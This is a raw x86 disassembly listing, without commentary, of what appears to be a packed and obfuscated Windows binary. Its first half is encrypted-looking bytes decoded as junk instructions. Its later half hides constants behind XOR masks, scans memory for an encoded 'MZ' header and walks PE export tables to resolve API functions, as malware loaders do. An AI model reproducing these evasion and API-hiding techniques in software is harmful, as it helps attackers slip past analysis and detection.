  410d90:	pop    esi
  410d91:	in     al,dx
  410d92:	dec    esi
  410d93:	scas   eax,DWORD PTR es:[edi]
  410d94:	in     al,dx
  410d95:	adc    BYTE PTR [edi+0xe],dl
  410d98:	dec    ebx
  410d99:	xor    al,0x42
  410d9b:	int3   
  410d9c:	(bad)  
  410d9d:	frstor [edi]
  410d9f:	std    
  410da0:	and    eax,0x8b7f813b
  410da5:	aaa    
  410da6:	jbe    0x410d58
  410da8:	int3   
  410da9:	into   
  410daa:	in     eax,dx
  410dab:	mov    ch,0x8f
  410dad:	mov    DWORD PTR [esi-0x27],ebp
  410db0:	ja     0x410d4a
  410db2:	out    0x58,al
  410db4:	xlat   BYTE PTR ss:[ebx]
  410db6:	xchg   BYTE PTR [esi+0x34],dl
  410db9:	jmp    0x1550b17b
  410dbe:	push   0xcf374019
  410dc3:	xlat   BYTE PTR ds:[ebx]
  410dc4:	dec    edi
  410dc5:	dec    edi
  410dc6:	int3   
  410dc7:	ret    0x960
  410dca:	stos   BYTE PTR es:[edi],al
  410dcb:	ret    0xec09
  410dce:	dec    ebx
  410dcf:	repnz pop ebx
  410dd1:	int    0x3d
  410dd3:	dec    esp
  410dd4:	xchg   ecx,eax
  410dd5:	out    dx,eax
  410dd6:	mov    ebx,0x2c27b9da
  410ddb:	push   esi
  410ddc:	stos   BYTE PTR es:[edi],al
  410ddd:	sub    bh,BYTE PTR [ebx+0x6a]
  410de0:	addr16 arpl ax,si
  410de3:	out    0x6a,eax
  410de5:	inc    eax
  410de6:	or     eax,0x5ece00f3
  410deb:	or     cl,BYTE PTR [ebx-0x56]
  410dee:	adc    esp,ebx
  410df0:	fs test eax,0xc7886b54
  410df6:	push   esp
  410df7:	mov    ds:0xf286e7fa,eax
  410dfc:	test   BYTE PTR [esi-0x2dbbb846],ah
  410e02:	aas    
  410e03:	gs xchg ecx,eax
  410e05:	sbb    esp,DWORD PTR [ebp+0x5cca9d85]
  410e0b:	xchg   BYTE PTR [edi+0x33d5fdfe],ah
  410e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e12:	fs pop eax
  410e14:	jb     0x410ddd
  410e16:	adc    DWORD PTR [edx+0x20],esi
  410e19:	push   ecx
  410e1a:	int    0x5d
  410e1c:	inc    edx
  410e1d:	fnstsw WORD PTR [edx+0x67]
  410e20:	fist   WORD PTR [ebx]
  410e22:	test   dh,ch
  410e24:	and    al,0xa7
  410e26:	das    
  410e27:	inc    ebx
  410e28:	push   edx
  410e29:	cmp    eax,0xd2fe2e92
  410e2e:	xor    eax,0x632a477d
  410e33:	icebp  
  410e34:	adc    edi,eax
  410e36:	enter  0x846d,0x66
  410e3a:	les    edx,FWORD PTR [esi*1+0x3159e5ef]
  410e41:	inc    ebx
  410e42:	pop    ebp
  410e43:	(bad)  
  410e45:	fidiv  WORD PTR [edi-0x6d]
  410e48:	mov    ch,0xc5
  410e4a:	sbb    al,0x60
  410e4c:	jge    0x410e3a
  410e4e:	wrmsr  
  410e50:	pop    esi
  410e51:	je     0x410e4f
  410e53:	mov    ecx,DWORD PTR [edi+0x3e]
  410e56:	push   ss
  410e57:	xchg   ebp,eax
  410e58:	inc    ecx
  410e59:	pushf  
  410e5a:	sub    al,0x26
  410e5c:	fistp  DWORD PTR [edi+0x32]
  410e5f:	fld    DWORD PTR [edi-0x6d065b74]
  410e65:	stos   BYTE PTR es:[edi],al
  410e66:	add    al,0xde
  410e68:	(bad)  
  410e69:	mov    al,0x1d
  410e6b:	xor    eax,0x96471c5e
  410e70:	cmp    ch,bl
  410e72:	int    0x73
  410e74:	arpl   WORD PTR [edx+ebp*4],ax
  410e77:	push   es
  410e78:	fwait
  410e79:	xor    BYTE PTR [ebx],cl
  410e7b:	icebp  
  410e7c:	hlt    
  410e7d:	data16 ficom WORD PTR [ebx]
  410e80:	sub    ebx,DWORD PTR [eax+0x385236b3]
  410e86:	dec    ebp
  410e87:	add    al,0xe0
  410e89:	push   edx
  410e8a:	das    
  410e8b:	cmp    ah,bh
  410e8d:	xor    ebp,DWORD PTR [esp-0x4e]
  410e91:	jns    0x410e9d
  410e93:	dec    ebp
  410e94:	mov    BYTE PTR [esi],ch
  410e96:	jge    0x410ee9
  410e98:	dec    esp
  410e99:	pop    ebp
  410e9a:	xchg   ecx,eax
  410e9b:	bound  edi,QWORD PTR [ebx]
  410e9d:	mov    esp,0xdafeb901
  410ea2:	cli    
  410ea3:	stos   BYTE PTR es:[edi],al
  410ea4:	in     al,dx
  410ea5:	les    esp,FWORD PTR [edi-0x77]
  410ea8:	or     ah,BYTE PTR [eax+0x403e61d3]
  410eae:	in     al,dx
  410eaf:	leave  
  410eb0:	inc    al
  410eb2:	inc    ecx
  410eb3:	lock lock dec ecx
  410eb6:	or     ch,cl
  410eb8:	mov    ebx,0x9a99b4f8
  410ebd:	fldenv [edi+0x395f202b]
  410ec3:	fmul   DWORD PTR [ecx+0x458ecdfe]
  410ec9:	lea    ebx,[edi+eax*1]
  410ecc:	sbb    ah,ch
  410ece:	shr    DWORD PTR [edi+0x36],0xbb
  410ed2:	sub    BYTE PTR [ebp+0x64a0e9bc],dl
  410ed8:	dec    esi
  410ed9:	jg     0x410ef7
  410edb:	das    
  410edc:	bound  ebp,QWORD PTR [edi]
  410ede:	(bad)  
  410edf:	and    edi,ebp
  410ee1:	fld    QWORD PTR [ecx]
  410ee3:	push   ecx
  410ee4:	out    0x52,al
  410ee6:	push   esi
  410ee7:	sbb    DWORD PTR [ebp+edi*2+0x32],eax
  410eeb:	push   ecx
  410eec:	mov    ds:0x623e58b5,al
  410ef1:	rol    BYTE PTR [esi+esi*2-0x57],0x2f
  410ef6:	mov    BYTE PTR ds:0x4ce7f830,dh
  410efc:	and    ebx,DWORD PTR [eax-0x51]
  410eff:	dec    esp
  410f00:	cmp    al,0x65
  410f02:	mov    esi,0xdd6ec6f0
  410f07:	jae    0x410ef4
  410f09:	xchg   ebp,eax
  410f0a:	mov    eax,0xb98bb426
  410f0f:	pop    ds
  410f10:	push   edi
  410f11:	fsubr  st,st(0)
  410f13:	lods   eax,DWORD PTR ds:[esi]
  410f14:	adc    DWORD PTR [edi-0x63],edx
  410f17:	shl    BYTE PTR [ebp+eiz*2-0x3b6aca2d],cl
  410f1e:	mov    edx,0xd3d053ec
  410f23:	out    0x8b,al
  410f25:	in     eax,0x67
  410f27:	mov    bl,0x64
  410f29:	leave  
  410f2a:	inc    esp
  410f2b:	ja     0x410f22
  410f2d:	xor    DWORD PTR [esi+eax*4],0xde121d5b
  410f34:	pop    edx
  410f35:	dec    eax
  410f36:	jmp    0xa1368cd9
  410f3b:	addr16 sar esi,0x33
  410f3f:	push   es
  410f40:	pop    es
  410f41:	jo     0x410fc0
  410f43:	push   0x73
  410f45:	jnp    0x410ee5
  410f47:	and    bh,BYTE PTR [edx+0x39]
  410f4a:	fcmovnbe st,st(1)
  410f4c:	and    bh,BYTE PTR [edx]
  410f4e:	mov    BYTE PTR [ebx+0x1e59f5a9],dl
  410f54:	test   eax,0x1c98fa25
  410f59:	or     BYTE PTR [esi-0xa525d97],al
  410f5f:	pop    edi
  410f60:	int3   
  410f61:	cmc    
  410f62:	add    eax,0xee8a8b48
  410f67:	mov    ebp,0x5ef064cf
  410f6c:	inc    edx
  410f6d:	xchg   edx,eax
  410f6e:	into   
  410f6f:	clc    
  410f70:	fnstcw WORD PTR [ebx-0xb]
  410f73:	inc    ebx
  410f74:	stos   BYTE PTR es:[edi],al
  410f75:	mov    ds:0x1750b06e,al
  410f7a:	xchg   esi,eax
  410f7b:	sub    dl,BYTE PTR ds:0x46e46830
  410f81:	pop    edi
  410f82:	(bad)  
  410f83:	or     cl,BYTE PTR [esi-0x640c5325]
  410f89:	gs xor al,0xb9
  410f8c:	sub    al,0x2
  410f8e:	xor    DWORD PTR [edx+ebp*8],0x50
  410f92:	retf   0x2634
  410f95:	jnp    0x410fc6
  410f97:	sub    eax,0xf006c6af
  410f9c:	out    dx,al
  410f9d:	mov    ebx,esp
  410f9f:	nop
  410fa0:	mov    WORD PTR [ebx-0x87eecc],?
  410fa6:	cmp    ebx,DWORD PTR [eax-0x51d257e9]
  410fac:	adc    DWORD PTR [ecx+eax*2+0x55],esp
  410fb0:	pop    ecx
  410fb1:	aas    
  410fb2:	gs adc al,0xd9
  410fb5:	lock stc 
  410fb7:	cs mov dh,0xbf
  410fba:	mov    esi,0xd23b7dc4
  410fbf:	hlt    
  410fc0:	rcl    DWORD PTR [edx-0x475e448b],cl
  410fc6:	or     eax,0xaf266192
  410fcb:	sbb    ebp,DWORD PTR [edi]
  410fcd:	adc    ebp,edx
  410fcf:	ds xchg edx,eax
  410fd1:	ds dec esi
  410fd3:	sub    al,0x6f
  410fd5:	loopne 0x410f9a
  410fd7:	xchg   edi,eax
  410fd8:	push   esi
  410fd9:	sbb    DWORD PTR [eax],ecx
  410fdb:	jno    0x410ffb
  410fdd:	mov    ss:0xc91d6021,eax
  410fe3:	mov    dh,0x51
  410fe5:	rcr    DWORD PTR [ebx-0x39],0x29
  410fe9:	loopne 0x410f8e
  410feb:	das    
  410fec:	adc    al,0x68
  410fee:	xchg   esi,eax
  410fef:	push   ds
  410ff0:	jecxz  0x410ffa
  410ff2:	or     eax,DWORD PTR [ebx-0x1cfb8bd3]
  410ff8:	pop    ebp
  410ff9:	test   al,0x3e
  410ffb:	adc    eax,0x7d0d8d72
  411000:	jecxz  0x41103b
  411002:	inc    esp
  411003:	push   0x62
  411005:	dec    esp
  411006:	sti    
  411007:	cld    
  411008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411009:	xor    BYTE PTR [esi-0x19f077d3],cl
  41100f:	mov    al,ds:0x15c16e7f
  411014:	sub    dh,ch
  411016:	fadd   QWORD PTR [edx+0x39]
  411019:	imul   ebx,DWORD PTR [ebp-0x1144dd54],0xa616f11
  411023:	dec    esi
  411024:	pusha  
  411025:	dec    edx
  411026:	mov    esi,0x7195d5f1
  41102b:	sub    bh,al
  41102d:	mov    ebx,0x6da7f410
  411032:	(bad)  
  411033:	ret    0x88e3
  411036:	cmp    eax,0x6a34202e
  41103b:	std    
  41103c:	xor    al,0x1
  41103e:	xor    BYTE PTR [edx+0x33],al
  411041:	mov    ecx,0x5cf645f2
  411046:	xchg   esi,eax
  411047:	dec    esi
  411048:	add    DWORD PTR [edx-0x51],ecx
  41104b:	mov    eax,ds:0x9401bbef
  411050:	out    0xd0,eax
  411052:	in     al,dx
  411053:	dec    ebx
  411054:	jns    0x4110d3
  411056:	and    eax,0x25d157d6
  41105b:	cmpxchg ch,dh
  41105e:	(bad)  
  41105f:	retf   
  411060:	xor    ah,dh
  411062:	call   0xb61c:0x143d1028
  411069:	adc    BYTE PTR [ecx],al
  41106b:	xor    DWORD PTR [ecx],esp
  41106d:	xchg   esi,eax
  41106e:	das    
  41106f:	nop
  411070:	inc    ebp
  411071:	xchg   ebp,eax
  411072:	cmp    eax,DWORD PTR [edi+ebx*8+0x1a]
  411076:	pop    ss
  411077:	test   al,0x7f
  411079:	inc    ebx
  41107a:	pop    ebx
  41107b:	out    0xaa,al
  41107d:	pop    es
  41107e:	cwde   
  41107f:	hlt    
  411080:	mov    eax,0x89ec51bc
  411085:	out    dx,al
  411086:	es add eax,0xb6fa00b6
  41108c:	fisttp QWORD PTR [esp+eiz*2-0x3d366951]
  411093:	and    esp,DWORD PTR [edi-0x3a4a64ba]
  411099:	xor    ah,ch
  41109b:	(bad)  
  41109c:	ret    
  41109d:	fisub  DWORD PTR [ebx+ebp*8]
  4110a0:	aas    
  4110a1:	pop    eax
  4110a2:	hlt    
  4110a3:	adc    DWORD PTR [ebx+0x630987e7],eax
  4110a9:	bound  esp,QWORD PTR [edx]
  4110ab:	test   al,0x7e
  4110ad:	push   esp
  4110ae:	nop
  4110af:	mov    dl,0xc3
  4110b1:	cmp    al,0x2c
  4110b3:	ja     0x411069
  4110b5:	jl     0x41105c
  4110b7:	adc    eax,0x1a192cca
  4110bc:	mov    edi,0x892c6d31
  4110c1:	arpl   WORD PTR [edi],di
  4110c3:	dec    ebx
  4110c4:	jb     0x41108f
  4110c6:	call   0x3173:0x79073392
  4110cd:	xchg   edi,eax
  4110ce:	push   ecx
  4110cf:	rcl    ch,cl
  4110d1:	xor    DWORD PTR [ebx-0x69ba19bf],edx
  4110d7:	or     al,0x27
  4110d9:	pushf  
  4110da:	sbb    al,0x7e
  4110dc:	xor    bh,BYTE PTR [ebp-0x4674090]
  4110e2:	dec    ecx
  4110e3:	or     DWORD PTR [esp+ebp*4-0x3b73c3d9],0xffffffbd
  4110eb:	jno    0x41108d
  4110ed:	xlat   BYTE PTR ds:[ebx]
  4110ee:	mov    eax,esi
  4110f0:	push   ebx
  4110f1:	scas   eax,DWORD PTR es:[edi]
  4110f2:	mov    dl,0x49
  4110f4:	mov    BYTE PTR [edx+0x16cecff0],bh
  4110fa:	cmp    BYTE PTR [edi-0x5174be7b],dl
  411100:	dec    esp
  411101:	or     al,0xfa
  411103:	call   0x3271:0xa58f9a4b
  41110a:	aad    0x5b
  41110c:	fcom   DWORD PTR [ebx]
  41110e:	lahf   
  41110f:	outs   dx,BYTE PTR ds:[esi]
  411110:	jnp    0x411162
  411112:	in     al,0x1b
  411114:	call   FWORD PTR [eax]
  411116:	adc    DWORD PTR ds:0x9b8270f8,ebx
  41111c:	mov    BYTE PTR [ebx-0x7f],dh
  41111f:	sahf   
  411120:	jbe    0x41114e
  411122:	xchg   DWORD PTR [ecx],edi
  411124:	daa    
  411125:	ins    BYTE PTR es:[edi],dx
  411126:	cmp    al,0xac
  411128:	cli    
  411129:	xchg   ecx,eax
  41112a:	add    DWORD PTR [ecx-0x5e],edi
  41112d:	push   ss
  41112e:	jmp    0x1d5e085b
  411133:	pop    ds
  411134:	add    DWORD PTR [edi+0x7bba1f64],ebp
  41113a:	je     0xc42861ea
  411140:	or     eax,DWORD PTR [eax]
  411142:	leave  
  411143:	out    0x49,eax
  411145:	scas   al,BYTE PTR es:[edi]
  411146:	mov    DWORD PTR [eax-0x52],ebp
  411149:	(bad)  
  41114b:	and    edi,DWORD PTR [edx]
  41114d:	pushf  
  41114e:	pop    ds
  41114f:	inc    ecx
  411150:	push   eax
  411151:	aas    
  411152:	mov    bl,0x4f
  411154:	push   edi
  411155:	int    0xb7
  411157:	ds mov al,0x29
  41115a:	push   ebx
  41115b:	dec    esi
  41115c:	test   eax,0x2bd3065d
  411161:	les    eax,FWORD PTR ds:0x9e619f7f
  411167:	jmp    0x41110e
  411169:	addr16 add al,0x8e
  41116c:	push   ss
  41116d:	arpl   dx,di
  41116f:	adc    eax,0x77a9069f
  411174:	popa   
  411175:	cmp    al,BYTE PTR [ebp-0x37]
  411178:	in     eax,0xe9
  41117a:	push   ds
  41117b:	mov    eax,ds:0x90c5c448
  411180:	mov    cl,0x19
  411182:	int    0xe4
  411184:	jmp    0xae9b:0x826f9ed8
  41118b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41118c:	sahf   
  41118d:	push   0xfeb3de9c
  411192:	std    
  411193:	xor    eax,0xb05132dd
  411198:	xchg   esi,eax
  411199:	or     edx,DWORD PTR [eax+0x1c58ebfe]
  41119f:	mov    bl,0xf5
  4111a1:	shr    DWORD PTR [ecx],1
  4111a3:	ds call 0x5626bcad
  4111a9:	pop    edx
  4111aa:	xor    ebx,DWORD PTR [ecx+0x7cd60b02]
  4111b0:	mov    edx,0x97a9b36d
  4111b5:	dec    eax
  4111b6:	popa   
  4111b7:	xchg   DWORD PTR [ecx],ebx
  4111b9:	aas    
  4111ba:	test   al,0x7f
  4111bc:	xlat   BYTE PTR ds:[ebx]
  4111bd:	sub    BYTE PTR [edi-0x6750194c],dl
  4111c3:	cmc    
  4111c4:	adc    dh,cl
  4111c6:	je     0x411182
  4111c8:	leave  
  4111c9:	ror    edx,cl
  4111cb:	xor    edi,DWORD PTR [ecx]
  4111cd:	(bad)  
  4111ce:	push   esp
  4111cf:	push   0x34
  4111d1:	aad    0x1c
  4111d3:	addr16 int3 
  4111d5:	xor    BYTE PTR [ecx+eax*4-0x2b],0x95
  4111da:	sub    eax,0x8aa05251
  4111df:	xor    eax,0xf458e7e3
  4111e4:	push   esp
  4111e5:	arpl   WORD PTR [edx],ax
  4111e7:	loopne 0x4111c2
  4111e9:	push   ebp
  4111ea:	xor    dl,BYTE PTR [ebx]
  4111ec:	scas   eax,DWORD PTR es:[edi]
  4111ed:	sbb    ecx,edi
  4111ef:	sub    edi,eax
  4111f1:	pop    edx
  4111f2:	sbb    ecx,ebp
  4111f4:	mov    dh,0xa6
  4111f6:	mov    edi,DWORD PTR [edx+0x3e]
  4111f9:	or     BYTE PTR [eax],0x33
  4111fc:	test   BYTE PTR [ebx-0x24],0x3f
  411200:	or     bh,BYTE PTR [ebp-0x7128c2f3]
  411206:	imul   ebp,DWORD PTR [eax+0x3b96b2bf],0xf
  41120d:	gs icebp 
  41120f:	mov    dl,BYTE PTR [edx]
  411211:	rol    BYTE PTR ds:0xe19e3082,cl
  411217:	scas   eax,DWORD PTR es:[edi]
  411218:	xor    DWORD PTR [ecx+ebp*2],esi
  41121b:	pop    esi
  41121c:	shl    BYTE PTR [esi-0x41],1
  41121f:	imul   edx,DWORD PTR [ecx],0xf8e48069
  411225:	(bad)  
  411226:	stos   DWORD PTR es:[di],eax
  411228:	and    DWORD PTR [ebx],ecx
  41122a:	mov    dl,0x6e
  41122c:	dec    ebx
  41122d:	and    al,0x3b
  41122f:	sub    DWORD PTR [esi-0xc],esi
  411232:	cdq    
  411233:	push   edx
  411234:	and    ah,dl
  411236:	mov    eax,0x5639d1a2
  41123b:	sbb    BYTE PTR [edi+eiz*2+0x40],bl
  41123f:	cdq    
  411240:	xor    al,0xda
  411242:	cdq    
  411243:	fadd   DWORD PTR [ebp+0x620b8316]
  411249:	dec    edx
  41124a:	mov    ebp,0xbfd42975
  41124f:	test   DWORD PTR ds:0x4a5ba7f5,esi
  411255:	xchg   edi,eax
  411256:	pop    es
  411257:	inc    edx
  411258:	sahf   
  411259:	and    ah,cl
  41125b:	inc    edi
  41125c:	int3   
  41125d:	jbe    0x4112bc
  41125f:	jbe    0x41123d
  411261:	repz add edi,DWORD PTR [eax+0x31deeea4]
  411268:	xchg   esi,eax
  411269:	jmp    0xedf94b25
  41126e:	push   esi
  41126f:	(bad)  
  411270:	leave  
  411271:	sbb    ebx,DWORD PTR [eax+0x4915f425]
  411277:	cmp    edi,ebx
  411279:	aad    0x42
  41127b:	jle    0x4112bb
  41127d:	adc    al,0x4f
  41127f:	sub    al,0xa8
  411281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411282:	sbb    cl,BYTE PTR [ebx+0x54]
  411285:	in     al,0x8b
  411287:	inc    ebp
  411288:	cld    
  411289:	add    edi,edx
  41128b:	cmp    DWORD PTR [eax],edi
  41128d:	mov    eax,DWORD PTR [ebp-0x4]
  411290:	mov    edi,DWORD PTR [ebp+0x10]
  411293:	jg     0x4112a6
  411299:	xor    edi,ecx
  41129b:	mov    ebx,esi
  41129d:	sub    ebx,edi
  41129f:	add    DWORD PTR [eax],ebx
  4112a1:	jmp    0x4112ac
  4112a6:	xor    edi,ecx
  4112a8:	add    edi,edx
  4112aa:	add    DWORD PTR [eax],edi
  4112ac:	mov    eax,DWORD PTR [ebp-0x8]
  4112af:	mov    edi,DWORD PTR [ebp-0x10]
  4112b2:	mov    eax,DWORD PTR [eax]
  4112b4:	xor    edi,ecx
  4112b6:	add    edi,0x3272df
  4112bc:	not    edi
  4112be:	and    eax,edi
  4112c0:	movsx  di,BYTE PTR [eax+0x1]
  4112c5:	mov    ebx,0x3b50
  4112ca:	sub    di,bx
  4112cd:	mov    ebx,0x8a8c
  4112d2:	xor    di,bx
  4112d5:	mov    ebx,0x4f86
  4112da:	cmp    di,bx
  4112dd:	jne    0x411305
  4112e3:	movsx  di,BYTE PTR [eax]
  4112e7:	mov    ebx,0x3b50
  4112ec:	sub    di,bx
  4112ef:	mov    ebx,0x8a8c
  4112f4:	xor    di,bx
  4112f7:	mov    ebx,0x4e71
  4112fc:	cmp    di,bx
  4112ff:	je     0x411315
  411305:	mov    edi,DWORD PTR [ebp-0x10]
  411308:	xor    edi,ecx
  41130a:	mov    ebx,esi
  41130c:	sub    ebx,edi
  41130e:	add    eax,ebx
  411310:	jmp    0x4112c0
  411315:	mov    esi,DWORD PTR [ebp-0x14]
  411318:	mov    esi,DWORD PTR [esi]
  41131a:	mov    edi,DWORD PTR [eax+0x3c]
  41131d:	lea    esi,[edi+esi*8+0x78]
  411321:	mov    esi,DWORD PTR [esi+eax*1]
  411324:	mov    DWORD PTR [ebp-0x8],esi
  411327:	mov    esi,DWORD PTR [ebp+0x8]
  41132a:	xor    esi,ecx
  41132c:	add    esi,edx
  41132e:	mov    DWORD PTR [ebp-0x14],esi
  411331:	mov    esi,DWORD PTR [ebp+0x8]
  411334:	mov    edi,DWORD PTR [ebp-0x8]
  411337:	xor    esi,ecx
  411339:	add    esi,edx
  41133b:	pop    ebx
  41133c:	cmp    edi,esi
  41133e:	jne    0x41135c
  411344:	mov    eax,DWORD PTR [ebp+0xc]
  411347:	xor    eax,ecx
  411349:	mov    ecx,DWORD PTR [ebp-0x8]
  41134c:	add    eax,edx
  41134e:	imul   eax,ecx
  411351:	mov    DWORD PTR [ebp-0x8],eax
  411354:	push   DWORD PTR [ebp+0x18]
  411357:	jmp    0x4113b0
  41135c:	mov    ecx,DWORD PTR [ebp-0x8]
  41135f:	add    ecx,eax
  411361:	mov    DWORD PTR [ebp-0x14],ecx
  411364:	mov    ecx,DWORD PTR [ebp-0x14]
  411367:	mov    ecx,DWORD PTR [ecx+0xc]
  41136a:	movsx  cx,BYTE PTR [ecx+eax*1]
  41136f:	mov    edx,0x3b50
  411374:	sub    cx,dx
  411377:	mov    edx,0x8a8c
  41137c:	xor    cx,dx
  41137f:	mov    edx,0x4e77
  411384:	cmp    cx,dx
  411387:	jne    0x411354
  41138d:	mov    ecx,DWORD PTR ds:0x42e42f
  411393:	mov    ecx,DWORD PTR [ecx+0x198]
  411399:	mov    DWORD PTR [ecx],eax
  41139b:	jmp    0x4113c1
  4113a0:	mov    ecx,DWORD PTR [ebp+0x18]
  4113a3:	cmp    ecx,0xf89c85b8
  4113a9:	jne    0x4113c1
  4113af:	push   eax
  4113b0:	push   DWORD PTR [ebp+0x14]
  4113b3:	push   DWORD PTR [ebp+0x10]
  4113b6:	push   DWORD PTR [ebp+0xc]
  4113b9:	push   DWORD PTR [ebp+0x8]
  4113bc:	call   0x40c765
  4113c1:	pop    edi
  4113c2:	pop    esi
  4113c3:	leave  
  4113c4:	ret    0x14
  4113c7:	push   ebp
  4113c8:	mov    ebp,esp
  4113ca:	sub    esp,0xc
  4113cd:	push   esi
  4113ce:	mov    ecx,DWORD PTR ds:0x424aed
  4113d4:	mov    esi,DWORD PTR ds:0x424b09
  4113da:	sub    esi,ecx
  4113dc:	and    ecx,DWORD PTR [ecx+esi*1]
  4113df:	mov    esi,0xf89c85b9
  4113e4:	or     DWORD PTR ds:0x42a01c,0x3fe4
  4113ee:	mov    DWORD PTR [ebp-0x8],esi
  4113f1:	xor    ecx,ecx
  4113f3:	xor    ecx,DWORD PTR ds:0x424af5
  4113f9:	xor    edx,edx
  4113fb:	add    edx,DWORD PTR ds:0x424b01
  411401:	sub    ecx,edx
  411403:	imul   ecx,DWORD PTR [ecx+edx*1]
  411407:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  41140e:	add    edx,ecx
  411410:	push   edi
  411411:	adc    edx,DWORD PTR ds:0x42c010
  411417:	mov    eax,eax
  411419:	mov    eax,DWORD PTR [ebp-0x4]
  41141c:	xor    ecx,ecx
  41141e:	or     ecx,DWORD PTR ds:0x429004
  411424:	adc    ecx,DWORD PTR ds:0x42a008
  41142a:	mov    DWORD PTR ds:0x429004,ecx
  411430:	mov    edi,DWORD PTR [ebp-0x8]
  411433:	or     edx,ecx
  411435:	mov    ecx,0x7510899
  41143a:	xor    eax,ecx
  41143c:	and    DWORD PTR ds:0x42d004,0x0
  411446:	jmp    0x411458
  41144b:	mov    edx,DWORD PTR ds:0x42d004
  411451:	inc    edx
  411452:	mov    DWORD PTR ds:0x42d004,edx
  411458:	cmp    DWORD PTR ds:0x42d004,0x10
  41145f:	jae    0x41148d
  411465:	cmp    DWORD PTR ds:0x42d004,0x19
  41146c:	jne    0x411482
  411472:	push   0x42b014
  411477:	push   0x42e205
  41147c:	call   DWORD PTR ds:0x42ed6f
  411482:	jmp    0x41144b
  411487:	add    DWORD PTR ds:0x429010,ebx
  41148d:	xor    edi,ecx
  41148f:	add    DWORD PTR ds:0x42c010,0x42b008
  411499:	mov    edx,0x3272e0
  41149e:	add    DWORD PTR ds:0x42a00c,0x429024
  4114a8:	add    edi,edx
  4114aa:	sbb    DWORD PTR ds:0x42c00c,0x42c008
  4114b4:	add    eax,edx
  4114b6:	add    DWORD PTR ds:0x429014,0x42901c
  4114c0:	imul   eax,edi
  4114c3:	mov    DWORD PTR ds:0x429020,0x6d85
  4114cd:	mov    edi,DWORD PTR [ebp+0xc]
  4114d0:	mov    DWORD PTR ds:0x42a004,0x5a66
  4114da:	cmp    edi,eax
  4114dc:	je     0x411531
  4114e2:	mov    DWORD PTR [ebp-0xc],esi
  4114e5:	mov    eax,DWORD PTR [ebp-0xc]
  4114e8:	mov    esi,DWORD PTR [ebp+0xc]
  4114eb:	xor    eax,ecx
  4114ed:	lea    eax,[eax*8+0x1939778]
  4114f4:	mov    eax,DWORD PTR [esi+eax*1]
  4114f7:	mov    DWORD PTR [ebp+0xc],eax
  4114fa:	mov    eax,DWORD PTR [ebp-0x4]
  4114fd:	mov    esi,DWORD PTR [ebp-0x8]
  411500:	xor    eax,ecx
  411502:	xor    esi,ecx
  411504:	add    esi,edx
  411506:	add    eax,edx
  411508:	imul   eax,esi
  41150b:	mov    esi,DWORD PTR [ebp+0xc]
  41150e:	cmp    esi,eax
  411510:	je     0x411531
  411516:	mov    eax,DWORD PTR [ebp-0x4]
  411519:	xor    eax,ecx
  41151b:	mov    ecx,DWORD PTR [ebp+0xc]
  41151e:	add    eax,edx
  411520:	imul   eax,ecx
  411523:	add    eax,DWORD PTR [ebp+0x8]
  411526:	mov    DWORD PTR [ebp+0xc],eax
  411529:	mov    eax,DWORD PTR [ebp+0xc]
  41152c:	jmp    0x411542
  411531:	mov    eax,DWORD PTR [ebp-0x4]
  411534:	mov    esi,DWORD PTR [ebp-0x8]
  411537:	xor    esi,ecx
  411539:	xor    eax,ecx
  41153b:	add    esi,edx
  41153d:	add    eax,edx
  41153f:	imul   eax,esi
  411542:	pop    edi
  411543:	pop    esi
  411544:	leave  
  411545:	ret    0x8
  411548:	push   ebp
  411549:	mov    ebp,esp
  41154b:	push   ecx
  41154c:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  411553:	mov    eax,DWORD PTR [ebp-0x4]
  411556:	and    edx,0x4ee2
  41155c:	mov    edx,DWORD PTR [ebp+0x10]
  41155f:	and    DWORD PTR ds:0x42c01c,0x0
  411569:	mov    ecx,DWORD PTR ds:0x42c01c
  41156f:	inc    ecx
  411570:	mov    DWORD PTR ds:0x42c01c,ecx
  411576:	cmp    DWORD PTR ds:0x42c01c,0x10
  41157d:	jne    0x41158e
  411583:	push   0x42e042
  411588:	call   DWORD PTR ds:0x42ed73
  41158e:	cmp    DWORD PTR ds:0x42c01c,0xf
  411595:	jne    0x4115a8
  41159b:	mov    ecx,DWORD PTR ds:0x42c01c
  4115a1:	inc    ecx
  4115a2:	mov    DWORD PTR ds:0x42c01c,ecx
  4115a8:	cmp    DWORD PTR ds:0x42c01c,0x1c
  4115af:	jb     0x411569
  4115b5:	mov    ecx,0x7510899
  4115ba:	adc    DWORD PTR ds:0x42a000,0x42c010
  4115c4:	xor    eax,ecx
  4115c6:	sbb    DWORD PTR ds:0x429018,0x70b
  4115d0:	add    eax,0x3272e0
  4115d5:	mov    DWORD PTR [edx],eax
  4115d7:	mov    edx,DWORD PTR ds:0x429000
  4115dd:	add    DWORD PTR ds:0x42d01c,edx
  4115e3:	mov    eax,DWORD PTR [ebp+0xc]
  4115e6:	and    DWORD PTR ds:0x42a008,0x0
  4115f0:	mov    edx,DWORD PTR ds:0x42a008
  4115f6:	inc    edx
  4115f7:	mov    DWORD PTR ds:0x42a008,edx
  4115fd:	cmp    DWORD PTR ds:0x42a008,0x6
  411604:	jne    0x411613
  41160a:	push   DWORD PTR [ebp-0x24]
  41160d:	call   DWORD PTR ds:0x42ed77
  411613:	cmp    DWORD PTR ds:0x42a008,0x5
  41161a:	jne    0x41162d
  411620:	mov    edx,DWORD PTR ds:0x42a008
  411626:	inc    edx
  411627:	mov    DWORD PTR ds:0x42a008,edx
  41162d:	cmp    DWORD PTR ds:0x42a008,0x1c
  411634:	jb     0x4115f0
  41163a:	xor    eax,ecx
  41163c:	push   esi
  41163d:	mov    esi,DWORD PTR [ebp+0x10]
  411640:	mov    edx,0x3272e0
  411645:	add    eax,edx
  411647:	mov    DWORD PTR [esi+0x4],eax
  41164a:	mov    eax,DWORD PTR [ebp+0x14]
  41164d:	mov    esi,DWORD PTR [ebp+0x10]
  411650:	mov    DWORD PTR [esi+0x8],eax
  411653:	mov    eax,DWORD PTR [ebp+0x18]
  411656:	mov    esi,DWORD PTR [ebp+0x10]
  411659:	mov    DWORD PTR [esi+0xc],eax
  41165c:	mov    eax,DWORD PTR [ebp+0x1c]
  41165f:	mov    esi,DWORD PTR [ebp+0x10]
  411662:	mov    DWORD PTR [esi+0x10],eax
  411665:	mov    eax,DWORD PTR [ebp+0x8]
  411668:	xor    eax,ecx
  41166a:	add    eax,edx
